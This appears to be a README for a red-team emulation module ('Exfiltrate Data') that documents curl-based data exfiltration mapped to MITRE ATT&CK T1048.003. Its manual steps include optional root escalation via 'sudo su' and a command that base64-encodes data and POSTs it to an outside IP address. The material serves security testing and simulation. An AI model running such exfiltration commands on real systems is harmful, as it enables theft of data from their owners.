# Exfiltrate Data

![Meta TTP](https://img.shields.io/badge/Meta_TTP-blue)

This TTP enables the exfiltration of data via a specified endpoint using curl.

## Arguments

- **exfil_endpoint**: The endpoint to which the data will be exfiltrated.

## Pre-requisites

1. The executor must have access to the internet and the ability to make HTTP requests.

## Examples

You can run the TTP using the following example (after updating the arguments):
```bash
ttpforge run forgearmory//exfiltration/exfiltration-curl/ttp.yaml \
  --arg exfil_endpoint=https://httpbin.org/post
```

## Steps

1. **exfiltrate-data**: This step exfiltrates the data to the specified endpoint.

## Manual Reproduction Steps

```
### Attacker Configuration
docker run -e LOG_HTTP_BODY=STDOUT -t --rm -p 8080:8080 jmalloc/echo-server

### Target Configuration

# Escalate privileges to root
# (optional - depends on the goal(s) of your simulation)
sudo su

EXFIL_ENDPOINT="http://52.37.30.218:8080/data"
echo "I am data - why am I going where I am going?!" \
  | base64 -w 0 \
  | curl -X POST "${EXFIL_ENDPOINT}" -d @-
```

## MITRE ATT&CK Mapping

- **Tactics**:
    - TA0010 Exfiltration
- **Techniques**:
    - T1048 Exfiltration Over Alternative Protocol
- **Subtechniques**:
    - T1048.003 Exfiltration Over Alternative Protocol Exfiltration Over Unencrypted Non-C2 Protocol
